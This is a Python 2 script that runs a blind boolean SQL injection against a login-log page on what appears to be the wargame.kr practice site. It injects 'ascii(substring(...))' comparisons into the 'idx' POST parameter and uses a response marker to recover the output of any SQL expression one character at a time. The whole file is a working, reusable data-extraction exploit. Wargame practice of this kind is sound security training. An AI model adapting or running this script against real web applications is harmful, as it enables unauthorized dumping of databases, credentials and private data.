import requests
from requests.auth import HTTPBasicAuth
import sys

session = requests.Session()

def test(input):
    idx = "15096 and " + input 
    #username = "username=admi'|if(1,'n','777')|'"
    post_data = {'idx':idx}
    #print post_data
    headers = {"Accept-Encoding": "gzip, deflate",
               "Accept-Language": "en-US,en;q=0.5",
               "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Connection": "keep-alive"}
    response = session.post("http://wargame.kr:8080/ip_log_table/chk.php", headers=headers, data=post_data)
    #print response.text
    
    #bs = BeautifulSoup(response.text.replace("</br />",""))
    #form_section = bs.findAll('div', {"class": "alert alert-danger"}) #Error message
    #t = form_section[0]
    return ("2016-06-21 18:56:15" in response.text)

def brute_force_expr(expr):
    ch_i=1
    ascii_i=40 #(
    word = ""
    while True:
        found_char=False
        while(ascii_i<160): #~
            res = test("ascii(substring(("+expr+"),"+str(ch_i)+",1))="+str(ascii_i))
            if(res):
                word += chr(ascii_i)
                print "Found (",ch_i,") ",chr(ascii_i)," - ",word
                found_char = True
                break
            ascii_i+=1

        if(not found_char):
            print "No char at index ",ch_i," .. ending string construction.."
            break

        ascii_i = 1
        ch_i+=1
    return word

print brute_force_expr(sys.argv[1]) #Replacement fix the spaces problem!
